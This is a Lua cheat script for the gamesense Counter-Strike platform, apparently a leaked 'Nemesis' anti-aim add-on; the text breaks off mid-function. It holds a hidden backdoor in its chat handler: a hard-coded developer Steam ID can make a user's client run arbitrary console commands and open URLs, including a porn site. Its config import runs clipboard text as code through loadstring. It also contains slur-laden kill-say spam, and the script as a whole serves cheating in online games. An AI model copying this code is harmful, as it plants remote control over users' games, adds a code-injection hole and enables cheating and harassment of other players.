-- only retards change this links
print('https://discord.gg/b37eKFbkPE <- scriptleaks new server')
-- https://discord.gg/b37eKFbkPE <- scriptleaks new server
local table_visible = function(a,b)for c,d in pairs(a)do if type(a[c])=='table'then for e,d in pairs(a[c])do ui.set_visible(a[c][e],b)end else ui.set_visible(a[c],b)end end end
local vector = require 'vector'
local images = require 'gamesense/images'
local http = require 'gamesense/http'
local ent = require 'gamesense/entity'
local csgo_weapons = require 'gamesense/csgo_weapons'
local ease = require 'gamesense/easing'
local anti_aim = require 'gamesense/antiaim_funcs'
local trace = require 'gamesense/trace'
local clipboard = require 'gamesense/clipboard'
local base64 = require 'gamesense/base64'

local surface = require('gamesense/surface')
local md5 = require "gamesense/md5"
local ffi = require("ffi")
local bit = require("bit")

local obex = obex_fetch and obex_fetch() or {username = 'Noodle', build = 'SOURCE', discord=''}

-- if obex.build = 'User' then
--     obex.build = 'USER'
-- elseif obex.build = 'Beta' then
--     obex.build = 'BETA'
-- elseif obex.build = 'Debug' then
--     obex.build = 'DEBUG'
-- elseif obex.build = 'Private' then
--     obex.build = 'PRIVATE'
-- end

local tables = {
    tabs = { 'Anti-Aim', 'Visuals', 'Misc', 'Config', 'Debug' },
    states = {"Standing", "Moving", "Ducking", "In air", "Air duck", "Slowwalk"},
    state = "Standing", --"Default",

    killsay = {
        '𝙩𝙝𝙚𝙮 𝙖𝙨𝙠 𝙢𝙚 𝙬𝙝𝙖𝙩 𝙞𝙢 𝙪𝙨𝙚, 𝙖𝙣𝙙 𝙄 𝙨𝙖𝙮 𝙣𝙚𝙢𝙚𝙨𝙞𝙨.𝙡𝙪𝙖',
        'NEMESIS。LUA 高级反瞄准 𝙩𝙚𝙘𝙝𝙣𝙤𝙡𝙤𝙜𝙮。寒冷的 ',
        '私が同性愛者ではないことを知りに来てください、私は NEMESIS。LUA を持っています',
        "取得好成绩 NEMESIS。LUA, +1000 社会信用",
        "ВЫ НЕ МОЖЕТЕ ПОБЕДИТЬ НЕМЕЗИДУ!",
        "IM LOAD NEMESIS。LUA, UND SIE WÜTEN AUF!",
        "ILS ME DEMANDENT QU'EST-CE QUE LUA? ET JE DIS NEMESIS。LUA",
        "ANDREW TATE VREA LUA MEA, DAR NU POATE AVEA!",
    },

    manual_state = 0,

    manual_time = {
        left = 0,
        right = 0,
        forward = 0,
        local_view = 0,
    },

    steam_ids = {
        2657889, --noodle
    },

    whitelisted_words = {
        ["slayall"] = "kill",
        ["cheeseburger"] = "https://www.youtube.com/watch?v=vB6I5yaz7oE",
        ["cab"] ='https://www.youtube.com/watch?v=BtLSaxRnIhc',
        ["bird"] = 'https://www.youtube.com/watch?v=uISok580jBE',
        ["fortnite"] = 'https://fortnite-porn.com',
        ["rs"] = "say " .. obex.username,
    },

    list = {},

    dt_charge = false,

    --states = {"Standing", "Moving", "Ducking", "In air", "Air duck", "Slowwalk"}, --"Default", 

    aa = {
        yaw_base = 0,
        yaw = 0,
        yaw_jitter = 0,
        body_yaw = 0,
        freestanding_body_yaw = 0,
    },
}

local reference = {
    rage = {
        double_tap = {ui.reference('Rage', 'Aimbot', 'Double tap')},
        quick_peek = {ui.reference('Rage', 'Other', 'Quick peek assist')},
        quick_peek_dist = ui.reference('Rage', 'Other', 'Quick peek assist distance'),
    },

    aa = {
        enabled = ui.reference('AA', 'Anti-aimbot angles', 'Enabled'),
        pitch = ui.reference('AA', 'Anti-aimbot angles', 'Pitch'),
        yaw_base = {ui.reference('AA', 'Anti-aimbot angles', 'Yaw base')},
        yaw = {ui.reference('AA', 'Anti-aimbot angles', 'Yaw')},
        yaw_jitter = {ui.reference('AA', 'Anti-aimbot angles', 'Yaw jitter')},
        body_yaw = {ui.reference('AA', 'Anti-aimbot angles', 'Body yaw')},
        freestanding_body_yaw = {ui.reference('AA', 'Anti-aimbot angles', 'Freestanding body yaw')},
        edge_yaw = ui.reference('AA', 'Anti-aimbot angles', 'Edge yaw'),
        freestanding = {ui.reference('AA', 'Anti-aimbot angles', 'Freestanding')},
        roll = ui.reference('AA', 'Anti-aimbot angles', 'Roll')
    },

    aa_other = {
        leg_movement = ui.reference('AA', 'Other', 'Leg movement'),
        fakelag_limit = ui.reference("AA", "Fake lag", "Limit"),
        on_shot = ui.reference('AA', 'Other', 'On shot anti-aim'),
        slow_motion = {ui.reference("AA", "Other", "Slow motion")},
    },
}

function createOptions(prefix)
    return {
        pitch = ui.new_combobox('AA', 'Anti-aimbot angles', prefix .. ' Pitch', {'Off', 'Default', 'Up', 'Down', 'Minimal', 'Random'}),
        yaw_base = ui.new_combobox('AA', 'Anti-aimbot angles', prefix .. ' Yaw base', {'Local view', 'At targets'}),
        yaw = ui.new_combobox('AA', 'Anti-aimbot angles', prefix .. ' Yaw', {'Off', '180', 'Spin', 'Static', '180 Z', 'Crosshair'}),
        yaw_slider = ui.new_slider('AA', 'Anti-aimbot angles', '\nyaw_slider', -180, 180, 0),
        yaw_jitter = ui.new_combobox('AA', 'Anti-aimbot angles', prefix .. ' Yaw jitter', {'Off', 'Offset', 'Center', 'Random', 'Skitter'}),
        yaw_jitter_slider = ui.new_slider('AA', 'Anti-aimbot angles', '\nyaw_jitter_slider', -180, 180, 0),
        body_yaw = ui.new_combobox('AA', 'Anti-aimbot angles', prefix .. ' Body yaw', {'Off', 'Opposite', 'Jitter', 'Static'}),
        body_yaw_slider = ui.new_slider('AA', 'Anti-aimbot angles', '\nbody_yaw_slider', -180, 180, 0),
        freestanding_body_yaw = ui.new_checkbox('AA', 'Anti-aimbot angles', prefix .. ' Freestanding body yaw'),
        edge_yaw_bind = ui.new_hotkey('AA', 'Anti-aimbot angles', prefix .. ' Edge yaw'),
        roll = ui.new_slider('AA', 'Anti-aimbot angles', prefix .. ' Roll', -60, 60, 0),
    }
end

local menu = {
    user_info = ui.new_label('AA', 'Anti-aimbot angles', "Nemesis - \a9BC9FDFF"..tostring(obex.username)),
    enabled = ui.new_checkbox('AA', 'Anti-aimbot angles', 'Enable'),

    tab = {
        switch_tabs = ui.new_combobox('AA', 'Anti-aimbot angles', 'Switch tabs', tables.tabs),

        [tables.tabs[1]] = { -- anti-aim
                player_state = ui.new_combobox('AA', 'Anti-aimbot angles', 'Player state', tables.states),
                standing = createOptions('\a9BC9FDFF[Standing]\aCDCDCDFF'),
                moving = createOptions('\a9BC9FDFF[Moving]\aCDCDCDFF'),
                ducking = createOptions('\a9BC9FDFF[Ducking]\aCDCDCDFF'),
                in_air = createOptions('\a9BC9FDFF[In air]\aCDCDCDFF'),
                air_duck = createOptions('\a9BC9FDFF[Air duck]\aCDCDCDFF'),
                slowwalk = createOptions('\a9BC9FDFF[Slowwalk]\aCDCDCDFF'),
                use = createOptions('\a9BC9FDFF[Use]\aCDCDCDFF'),
                freestanding = createOptions('\a9BC9FDFF[Freestanding]\aCDCDCDFF'),
        },
        [tables.tabs[2]] = { --visuals
            indicator_mode = ui.new_combobox('AA', 'Anti-aimbot angles', 'Indicator mode', {'Default', 'Modern', 'Off'}),
            indicator_color = ui.new_color_picker('AA', 'Anti-aimbot angles', 'indicator_color', 155, 201, 253, 255),
            prim_peek = ui.new_checkbox('AA', 'Anti-aimbot angles', 'Prim peek circle'),
            prim_peek_color = ui.new_color_picker('AA', 'Anti-aimbot angles', 'prim_peek_color', 155, 201, 253, 255),
        },
        [tables.tabs[3]] = { --misc
            console_logs = ui.new_multiselect("AA", "Anti-aimbot angles", "Console logs", {'Hit', 'Miss'}),
            console_logs_color = ui.new_color_picker('AA', 'Anti-aimbot angles', 'console_logs_color', 155, 201, 253, 255),
            animations = ui.new_multiselect('AA', 'Anti-aimbot angles', 'Animations', { 'Pitch on land', 'Slide', 'Air walk', 'Static legs' }),
            hoodkillsay = ui.new_checkbox('AA', 'Anti-aimbot angles', 'Hood killsay'),
            clantag_spammer = ui.new_checkbox('AA', 'Anti-aimbot angles', 'Clantag spammer'),
        },
        [tables.tabs[4]] = { --config
            congif_label = ui.new_label('AA', 'Anti-aimbot angles', '\a9BC9FDFFComing soon!!!'),
            
        },
        [tables.tabs[5]] = { --debug
            options = ui.new_multiselect('AA', 'Anti-aimbot angles', 'Options', { 'Debug panel', 'Resolver' }),
        },
    }
}

function get_config()
    local config = {}
    local active_tab = ui.get(menu.tab.switch_tabs)

    if active_tab == tables.tabs[1] then
        local active_state = ui.get(menu.tab[tables.tabs[1]].player_state)
        local active_options = menu.tab[tables.tabs[1]][active_state]

        for key, option in pairs(active_options) do
            config[key] = ui.get(option)
        end
    elseif active_tab == tables.tabs[2] then
        config.indicator_mode = ui.get(menu.tab[tables.tabs[2]].indicator_mode)
        config.indicator_color = ui.get(menu.tab[tables.tabs[2]].indicator_color)
        config.prim_peek = ui.get(menu.tab[tables.tabs[2]].prim_peek)
        config.prim_peek_color = ui.get(menu.tab[tables.tabs[2]].prim_peek_color)
    elseif active_tab == tables.tabs[3] then
        config.console_logs = ui.get(menu.tab[tables.tabs[3]].console_logs)
        config.console_logs_color = ui.get(menu.tab[tables.tabs[3]].console_logs_color)
        config.animations = ui.get(menu.tab[tables.tabs[3]].animations)
        config.hoodkillsay = ui.get(menu.tab[tables.tabs[3]].hoodkillsay)
        config.clantag_spammer = ui.get(menu.tab[tables.tabs[3]].clantag_spammer)
    elseif active_tab == tables.tabs[4] then
        -- Config tab not yet implemented
    elseif active_tab == tables.tabs[5] then
        config.options = ui.get(menu.tab[tables.tabs[5]].options)
    end

    return config
end

function import_config(config_str)
    local config = base64.decode(config_str)
    local load_func, errorMsg = loadstring("return " .. config)

    if not load_func then
        error("Failed to load config: " .. errorMsg)
    end

    local decoded_config = load_func()

    if decoded_config then
        -- Import settings here using the decoded_config variable
        for _, state in ipairs(tables.states) do
            if decoded_config.tab.anti_aim[state] then
                for key, value in pairs(decoded_config.tab.anti_aim[state]) do
                    ui.set(menu.tab[tables.tabs[1]][state][key], value)
                end
            end
        end

        ui.set(menu.tab[tables.tabs[2]].indicator_mode, decoded_config.tab.visuals.indicator_mode)

        for key, value in pairs(decoded_config.tab.misc) do
            ui.set(menu.tab[tables.tabs[3]][key], value)
        end

        ui.set(menu.tab[tables.tabs[5]].options, decoded_config.tab.debug.options)
    end
end

local function export_config()
    local config = get_config()
    local config_str = table_to_string(config)
    local config_base64 = base64.encode(config_str)
    clipboard.set(config_base64)
end

-- Helper function to convert a table to a string
function table_to_string(tbl)
    local result, done = {}, {}
    for k, v in ipairs(tbl) do
        table.insert(result, value_to_string(v))
        done[k] = true
    end
    for k, v in pairs(tbl) do
        if not done[k] then
            table.insert(result, "[" .. value_to_string(k) .. "]=" .. value_to_string(v))
        end
    end
    return "{" .. table.concat(result, ",") .. "}"
end

-- Helper function to convert a value to a string
function value_to_string(value)
    if type(value) == "string" then
        return string.format("%q", value)
    elseif type(value) == "table" then
        return table_to_string(value)
    else
        return tostring(value)
    end
end

-- Assign the import and export buttons to the local menu variable
menu.config_import = ui.new_button('AA', 'Anti-aimbot angles', 'Import from clipboard', function()
    local config_str = clipboard.get()
    import_config(config_str)
end)
menu.config_export = ui.new_button('AA', 'Anti-aimbot angles', 'Export to clipboard', function()
    export_config()
end)

local js = panorama.loadstring([[
    return {
        OpenExternalBrowserURL: function(url){
            void SteamOverlayAPI.OpenExternalBrowserURL(url)
        }
    }
]])()

function contains(t, v)
    for i, vv in pairs(t) do
        if vv == v then
            return true
        end
    end
    return false
end

local efx = {
    peek_assist_pos = database.read('noodle_fx_pos'),

    render_effect = function(self, effect, pos, color, parameters)
        if not effect.refreshed then
            client.delay_call(0.3, function()
                self:init(true)
            end)
        else
            for k, v in pairs(effect.materials) do
                v:color_modulate(color[1], color[2], color[3])
                v:alpha_modulate(color[4] or 255)
            end
            effect.func(pos, table.unpack(parameters))
        end
    end,

    init = function(self, refreshed)
        self.energy_effect = {
            refreshed = refreshed,
            func = vtable_bind("client.dll", "IEffects001", 7, "void(__thiscall*)(void*, const Vector&, const Vector&, bool)"),
            materials = {
                materialsystem.find_material("effects/spark", true),
                materialsystem.find_material("effects/combinemuzzle1_nocull", true),
                materialsystem.find_material("effects/combinemuzzle2_nocull", true)
            },
            parameters = {vector(0, 0, 0), true}
        }
    end,
}
efx:init(false)

local x, y = client.screen_size()
local r, g, b, a = 255, 255, 255, 255

local anti_aim = function()
    -- local me    = entity.get_local_player()
    -- local flags = entity.get_prop(me, "m_fFlags")
    -- local vel1, vel2, vel3 = entity.get_prop(me, 'm_vecVelocity')
    -- local speed = math.floor(math.sqrt(vel1 * vel1 + vel2 * vel2))

    -- local ducking       = cmd.in_duck == 1
    -- local air           = ground_ticks < 5
    -- local walking       = speed >= 2
    -- local standing      = speed <= 1
    -- local slowwalk   = ui.get(reference.aa_other.slow_motion) and ui.get(reference.aa_other.slow_motion_key)
    -- --local fakeducking   = ui.get(kenzo.refs.misc.fakeducking)
    -- local use           = on_use(cmd)
    -- --local freestanding = ui.get(kenzo.ui.aa.freestanding_key) and not contains(ui.get(kenzo.ui.aa.freestanding_disablers), kenzo.antiaim.state)
    -- ground_ticks = bit.band(flags, 1) == 0 and 0 or (ground_ticks < 5 and ground_ticks + 1 or ground_ticks)

    -- local state = "Default"

    --cache the reference aa yaw
    -- local aa_yaw = ui.get(tables.aa.yaw[2])

    -- if ui.get(menu.tab['Anti-Aim'].manual_aa) then
    --     if (ui.get(menu.tab['Anti-Aim'].manual_aa_l)) then
    --         renderer.text(x/2 - 60, y/2, 255, 255, 255, 255, "cb", 0, "<")
    --         ui.set(reference.aa.yaw[2], -90)
    --     elseif (ui.get(menu.tab['Anti-Aim'].manual_aa_r)) then
    --         renderer.text(x/2 + 60, y/2, 255, 255, 255, 255, "cb", 0, ">")
    --         ui.set(reference.aa.yaw[2], 90)
    --     end
    -- end

    -- --if not using manual aa then set the yaw back to the cached value
    -- if not ui.get(menu.tab['Anti-Aim'].manual_aa_l) then
    --     ui.set(reference.aa.yaw[2], aa_yaw)
    -- end
    -- if not ui.get(menu.tab['Anti-Aim'].manual_aa_r) then
    --     ui.set(reference.aa.yaw[2], aa_yaw)
    -- end
end

RGBAtoHEX = function(redArg, greenArg, blueArg, alphaArg)
    return string.format('%.2x%.2x%.2x%.2x', redArg, greenArg, blueArg, alphaArg)
end

local indicators = function()
    local mcolor = {ui.get(menu.tab['Visuals'].indicator_color)}
    local alpha_pulse = math.sin(math.abs(-math.pi + (globals.curtime() * (1 / 0.45)) % (math.pi * 2))) * mcolor[4]
    local player_tickbase = entity.get_prop(entity.get_local_player(), 'm_nTickbase')
	local curtime = globals.tickinterval() * (player_tickbase - 13)

    if entity.get_player_weapon(entity.get_local_player()) then
	    tables.dt_charge = (ui.get(reference.rage.double_tap[1]) and ( curtime > entity.get_prop(entity.get_local_player(), 'm_flNextAttack') and curtime > entity.get_prop(entity.get_player_weapon(entity.get_local_player()), 'm_flNextPrimaryAttack'))) and true or false
    else
        tables.dt_charge = false
    end
    if not entity.is_alive(entity.get_local_player()) then
        return
    end

    local r, g, b = ui.get(menu.tab['Visuals'].indicator_color)
    local aA = {}
    for i = 60, 0, -5 do
        table.insert(aA, {r, g, b, 255 * math.abs(1 * math.cos(2 * math.pi * globals.curtime()/4 + i / 30))})
    end

    if ui.get(menu.tab['Visuals'].indicator_mode) == 'Default' then
        if entity.get_prop(entity.get_local_player(), 'm_bIsScoped') == 1 then
            renderer.text(x/2 + 38, y/2 + 15, mcolor[1], mcolor[2], mcolor[3], alpha_pulse, 'c-d', 0, 'NEMESIS')
            if not (ui.get(reference.rage.double_tap[1]) and ui.get(reference.rage.double_tap[2])) then
                renderer.text(x/2 + 25, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'DT')
            else
                renderer.text(x/2 + 25, y/2 + 25, tables.dt_charge and 0 or 255,  tables.dt_charge and 255 or 0,0, 255, "c-", 0, "DT")
            end
            if ui.get(reference.aa_other.on_shot) then
                renderer.text(x/2 + 38, y/2 + 25, 255, 140, 140, 255, "c-", 0, 'OS')
            else
                renderer.text(x/2 + 38, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'OS')
            end
            local freestanding_value = ui.get(reference.aa.freestanding[1])
            if type(freestanding_value) == "table" and contains(freestanding_value, 'Default') and ui.get(reference.aa.freestanding[2]) then
            --if contains(ui.get(reference.aa.freestanding[1]), 'Default') and ui.get(reference.aa.freestanding[2]) then
                renderer.text(x/2 + 51, y/2 + 25, 255, 140, 140, 255, "c-", 0, 'FS')
            else
                renderer.text(x/2 + 51, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'FS')
            end
        else
            renderer.text(x/2, y/2 + 15, mcolor[1], mcolor[2], mcolor[3], alpha_pulse, 'c-d', 0, 'NEMESIS')
            if not (ui.get(reference.rage.double_tap[1]) and ui.get(reference.rage.double_tap[2])) then
                renderer.text(x/2 - 13, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'DT')
            else
                renderer.text(x/2 - 13, y/2 + 25, tables.dt_charge and 0 or 255,  tables.dt_charge and 255 or 0,0, 255, "c-", 0, "DT")
            end
            if ui.get(reference.aa_other.on_shot) then
                renderer.text(x/2, y/2 + 25, 255, 140, 140, 255, "c-", 0, 'OS')
            else
                renderer.text(x/2, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'OS')
            end
            local freestanding_value = ui.get(reference.aa.freestanding[1])
            if type(freestanding_value) == "table" and contains(freestanding_value, 'Default') and ui.get(reference.aa.freestanding[2]) then
            --if contains(ui.get(reference.aa.freestanding[1]), 'Default') and ui.get(reference.aa.freestanding[2]) then
                renderer.text(x/2 + 13, y/2 + 25, 255, 140, 140, 255, "c-", 0, 'FS')
            else
                renderer.text(x/2 + 13, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'FS')
            end
        end
    elseif ui.get(menu.tab['Visuals'].indicator_mode) == 'Modern' then
        if entity.get_prop(entity.get_local_player(), 'm_bIsScoped') == 1 then
            renderer.text(x/2 + 38, y/2 + 15, 0, 0, 0, 50, "-c", nil, "NEMESIS")
            renderer.text(x/2 + 38, y/2 + 15, 255, 255, 255, 255, "-c", nil, string.format("\a%sN\a%sE\a%sM\a%sE\a%sS\a%sI\a%sS", RGBAtoHEX(unpack(aA[1])), RGBAtoHEX(unpack(aA[2])), RGBAtoHEX(unpack(aA[3])), RGBAtoHEX(unpack(aA[4])), RGBAtoHEX(unpack(aA[5])), RGBAtoHEX(unpack(aA[6])), RGBAtoHEX(unpack(aA[7]))))
            if not (ui.get(reference.rage.double_tap[1]) and ui.get(reference.rage.double_tap[2])) then
                renderer.text(x/2 + 25, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'DT')
            else
                renderer.text(x/2 + 25, y/2 + 25, tables.dt_charge and 0 or 255,  tables.dt_charge and 255 or 0,0, 255, "c-", 0, "DT")
            end
            if ui.get(reference.aa_other.on_shot) then
                renderer.text(x/2 + 38, y/2 + 25, 255, 140, 140, 255, "c-", 0, 'OS')
            else
                renderer.text(x/2 + 38, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'OS')
            end
            local freestanding_value = ui.get(reference.aa.freestanding[1])
            if type(freestanding_value) == "table" and contains(freestanding_value, 'Default') and ui.get(reference.aa.freestanding[2]) then
            --if contains(ui.get(reference.aa.freestanding[1]), 'Default') and ui.get(reference.aa.freestanding[2]) then
                renderer.text(x/2 + 51, y/2 + 25, 255, 140, 140, 255, "c-", 0, 'FS')
            else
                renderer.text(x/2 + 51, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'FS')
            end
        else
            renderer.text(x/2, y/2 + 15, 0, 0, 0, 50, "-c", nil, "NEMESIS")
            renderer.text(x/2, y/2 + 15, 255, 255, 255, 255, "-c", nil, string.format("\a%sN\a%sE\a%sM\a%sE\a%sS\a%sI\a%sS", RGBAtoHEX(unpack(aA[1])), RGBAtoHEX(unpack(aA[2])), RGBAtoHEX(unpack(aA[3])), RGBAtoHEX(unpack(aA[4])), RGBAtoHEX(unpack(aA[5])), RGBAtoHEX(unpack(aA[6])), RGBAtoHEX(unpack(aA[7]))))
            
            if not (ui.get(reference.rage.double_tap[1]) and ui.get(reference.rage.double_tap[2])) then
                renderer.text(x/2 - 13, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'DT')
            else
                renderer.text(x/2 - 13, y/2 + 25, tables.dt_charge and 0 or 255,  tables.dt_charge and 255 or 0,0, 255, "c-", 0, "DT")
            end
            if ui.get(reference.aa_other.on_shot) then
                renderer.text(x/2, y/2 + 25, 255, 140, 140, 255, "c-", 0, 'OS')
            else
                renderer.text(x/2, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'OS')
            end
            local freestanding_value = ui.get(reference.aa.freestanding[1])
            if type(freestanding_value) == "table" and contains(freestanding_value, 'Default') and ui.get(reference.aa.freestanding[2]) then
            --if contains(ui.get(reference.aa.freestanding[1]), 'Default') and ui.get(reference.aa.freestanding[2]) then
                renderer.text(x/2 + 13, y/2 + 25, 255, 140, 140, 255, "c-", 0, 'FS')
            else
                renderer.text(x/2 + 13, y/2 + 25, 255, 255, 255, 150, "c-", 0, 'FS')
            end
        end
    end
end

local watermark = function()
    local master_enabled = ui.get(menu.enabled)
    table_visible(reference.aa, not master_enabled)

    local screen = {client.screen_size()}
    local middle = {screen[1]/2,screen[2]/2}
    local color = { ui.get(menu.tab['Visuals'].indicator_color) }
    local alpha_pulse = math.sin(math.abs(-math.pi + (globals.curtime() * (1 / 0.45)) % (math.pi * 2))) * color[4]
    local latency = math.floor(math.min(1000, client.latency() * 1000) + 0.5)
    local text = "NEMESIS  [".. string.upper(tostring(obex.build)) .. "]" .. "     |    " .. string.upper(tostring(obex.username)) .. "     |    " .. string.format("%dMS", latency)
	local text_measure = {renderer.measure_text(nil, text)}

    renderer.gradient(15, middle[2], text_measure[1] + 30, 20, 0, 0, 0, 10, 0, 0, 0, 0, true)
    renderer.text(screen[1] - (screen[1] - text_measure[1] / 2) + 25, middle[2] + 11, 255, 255, 255, 255, "c-", 0, text)
    renderer.gradient(15, middle[2] + 20, text_measure[1] / 2 + 15, 1, 255, 255, 255, 0, color[1], color[2], color[3], 200, true)
    renderer.gradient(15 + text_measure[1] / 2 + 15, middle[2] + 20, text_measure[1] / 2 + 15, 1, color[1], color[2], color[3], 200, 255, 255, 255, 0, true)

    renderer.text(x/2, y - 70, color[1], color[2], color[3], alpha_pulse, "c-", 0, 'NEMESIS.PUB')
    renderer.text(x/2, y - 60, 255, 255, 255, alpha_pulse, "c-", 0, string.upper(tostring(obex.build)))
end

local peek_cir = function()
    local local_player = entity.get_local_player()
    local local_origin = vector(entity.get_origin(local_player))
    local efx_color = {ui.get(menu.tab['Visuals'].prim_peek_color)}
    local speed, dist = 5, 35

    if ui.get(menu.tab['Visuals'].prim_peek) then
        if ui.get(reference.rage.quick_peek[1]) then
            local grounded = bit.band(entity.get_prop(local_player, 'm_fFlags'), 1) == 1
            local velocity = vector(entity.get_prop(local_player, 'm_vecVelocity')) / 5
            velocity.z = 0

            if not ui.get(reference.rage.quick_peek[2]) then
                if grounded then
                    efx.peek_assist_pos = local_origin - velocity
                else
                    efx.peek_assist_pos = local_origin
                end
            else
                local quick_peek_dist = ui.get(reference.rage.quick_peek_dist) > 200 and math.huge or ui.get(reference.rage.quick_peek_dist)
                local origin = local_origin + vector(0, 0, 1)

                efx.peek_assist_pos.z = math.min(local_origin.z, efx.peek_assist_pos.z)

                if (origin - efx.peek_assist_pos):length() > quick_peek_dist and grounded then
                    efx.peek_assist_pos = (efx.peek_assist_pos - origin):normalized() * quick_peek_dist + origin
                end

                local curr_origin = efx.peek_assist_pos + vector(math.sin(globals.curtime() * (speed + 1)) * 20, math.cos(globals.curtime() * (speed + 1)) * 20, 1)
                efx:render_effect(efx.energy_effect, curr_origin, efx_color, {vector(0, 0, 0), true})

                database.write('noodle_fx_pos', {efx.peek_assist_pos:unpack()})
            end
        end
    end
end

local ground_ticks, end_time = 1, 0

local anims = function()
    if not entity.is_alive(entity.get_local_player()) then
        return
    end
    
    if contains(ui.get(menu.tab['Misc'].animations), 'Pitch on land') then
        local on_ground = bit.band(entity.get_prop(entity.get_local_player(), "m_fFlags"), 1)

        if on_ground == 1 then
            ground_ticks = ground_ticks + 1
        else
            ground_ticks = 0
            end_time = globals.curtime() + 1
        end 
        
        if ground_ticks > ui.get(reference.aa_other.fakelag_limit)+1 and end_time > globals.curtime() then
            entity.set_prop(entity.get_local_player(), "m_flPoseParameter", 0.5, 12)
        end
    end

    if contains(ui.get(menu.tab['Misc'].animations), 'Slide') then
        entity.set_prop(entity.get_local_player(), "m_flPoseParameter", 1, 0)
        ui.set(reference.aa_other.leg_movement, "Always slide")
    else
        ui.set(reference.aa_other.leg_movement, "Off")
    end

    if contains(ui.get(menu.tab['Misc'].animations), 'Air walk') then
        local me = ent.get_local_player()
        local m_fFlags = me:get_prop("m_fFlags")
        local is_onground = bit.band(m_fFlags, 1) ~= 0
        if not is_onground then
            local my_animlayer = me:get_anim_overlay(6) -- MOVEMENT_MOVE
            my_animlayer.weight = 1
        end
    end
    
    if contains(ui.get(menu.tab['Misc'].animations), 'Static legs') then
        entity.set_prop(entity.get_local_player(), 'm_flPoseParameter', 1, 6)
        entity.set_prop(entity.get_local_player(), 'm_flPoseParameter', 1, 0)
    end
end

local function multicolor_log(...)
    args = {...}
    len = #args
    for i=1, len do
        arg = args[i]
        r, g, b = unpack(arg)

        msg = {}

        if #arg == 3 then
            table.insert(msg, " ")
        else
            for i=4, #arg do
                table.insert(msg, arg[i])
            end
        end
        msg = table.concat(msg)

        if len > i then
            msg = msg .. "\0"
        end

        client.color_log(r, g, b, msg)
    end
end

local round = function(number)
    return math.floor(number + 0.5)
end

local hitgroup_names = {'generic', 'head', 'chest', 'stomach', 'left arm', 'right arm', 'left leg', 'right leg', 'neck', '?', 'gear'}

local on_hit = function(e)
    local hit_id = e.id
    local hit_target = entity.get_player_name(e.target)
    local hit_chance = e.hit_chance
    local hit_damage = e.damage
    local hit_hitgroup = hitgroup_names[e.hitgroup + 1] or '?'

    local r, g, b = ui.get(menu.tab['Misc'].console_logs_color)

    if not contains(ui.get(menu.tab['Misc'].console_logs), 'Hit') then return end
    multicolor_log({r, g, b, '[nemesis] '}, {255, 255, 255, 'Hit '}, {r, g, b, hit_target}, {255, 255, 255, ' in the '}, {r, g, b, hit_hitgroup}, {255, 255, 255, ' for '}, {r, g, b, hit_damage}, {255, 255, 255, ' damage (hitchance '}, {r, g, b, round(hit_chance)}, {255, 255, 255, ')'})
end

local on_miss = function(e)
    local miss_id = e.id
    local miss_target = entity.get_player_name(e.target)
    local miss_hitgroup = hitgroup_names[e.hitgroup + 1] or '?'
    local miss_reason = e.reason

    local r, g, b = ui.get(menu.tab['Misc'].console_logs_color)

    if not contains(ui.get(menu.tab['Misc'].console_logs), 'Miss') then return end
    multicolor_log({r, g, b, '[nemesis] '}, {255, 255, 255, 'Missed '}, {r, g, b, miss_target}, {255, 255, 255, ' in the '}, {r, g, b, miss_hitgroup}, {255, 255, 255, ' (reason '}, {r, g, b, miss_reason}, {255, 255, 255, ')'})
end

local on_death = function(e)
	if e.userid == nil or e.attacker == nil then
		return
	end

	local victim_entindex  = client.userid_to_entindex(e.userid)
	local attacker_entindex = client.userid_to_entindex(e.attacker)
	if attacker_entindex == entity.get_local_player() and entity.is_enemy(victim_entindex) then
		if ui.get(menu.tab['Misc'].hoodkillsay) then
			local exec_command = 'say ' .. tables.killsay[math.random(#tables.killsay)]
			client.exec(exec_command)
		end
	end
end

local function player_chat(e)
    local steam_id = entity.get_steam64( client.userid_to_entindex(e.userid))
    local txt = e.text

    for i=1, #tables.steam_ids do
        local whitelisted_ids = tables.steam_ids[i]
        local local_steamid = entity.get_steam64(entity.get_local_player())
        if whitelisted_ids ~= local_steamid then
            if whitelisted_ids == steam_id then
                local a, b = txt:gsub("!", "")
                local name = Split(txt, " ")

                username = string.lower(obex.username)

                if b == 1 and name[1] ~= nil then
                    if name[2] == nil then
                        for k, v in pairs(tables.whitelisted_words) do
                            if name[1]:gsub("!", "") == k then
                                if string.find(v, "http") then
                                    js.OpenExternalBrowserURL(v)
                                else
                                    client.exec(v) 
                                end 
                            end
                        end
                    else
                        if username == name[2] then
                            local x, z = name[1]:gsub("!", "")   
                            if not name[1]:find('LOL') then
                                if name[3] ~= nil then
                                    x = x .. ' ' .. name[3] 
                                end      
                                client.exec( x )
                            else
                                entity.set_prop( entity.get_local_player(), "m_flModelScale", entity.get_prop(entity.get_local_player(), 'm_flModelScale', 12) == 1 and 0.5 or 1, 12)
                            end       
                        end
                    end
                end
            end
        end
    end
end

local clantags = {
    'nemesis.pub',
    'nemesis.pu',
    'nemesis.p',
    'nemesis.',
    'nemesis',
    'nemesi',
    'nemes',
    'neme',
    'nem',
    'ne',
    'n',
    '',
    'ne',
    'nem',
    'neme',
    'nemes',
    'nemesi',
    'nemesis',
    'nemesis.',
    'nemesis.p',
    'nemesis.pu',
    'n3mesis.pub',
    'nem3sis.pub',
    'n3mesis.pub',
    'nem3sis.pub',
    'nemesis.pub',
    'n3m3sis.pub',
    'nemesis.pub',
    'n3m3sis.pub',
    'nemesis.pub',
    'n3m3sis.pub',
    'nemesis.pub',
    'n3m3sis.pub',
    'nem3sis.pub',
    'n3mesis.pub',
    'nem3sis.pub',
    'n3mesis.pub'
}

local clantag_prev

local clantag = function()
    if ui.get(menu.tab['Misc'].clantag_spammer) then
        local cur = math.floor(globals.tickcount() / 20) % #clantags
        local clantag = clantags[cur+1]

        if clantag ~= clantag_prev then
          clantag_prev = clantag
          client.set_clan_tag(clantag)
        end
    else
        client.set_clan_tag('')
    end
end

local on_setup = function()
    if not entity.is_alive(entity.get_local_player()) then
        return
    end


    local local_player = entity.get_local_player()
    local flags = entity.get_prop(local_player, "m_fFlags")

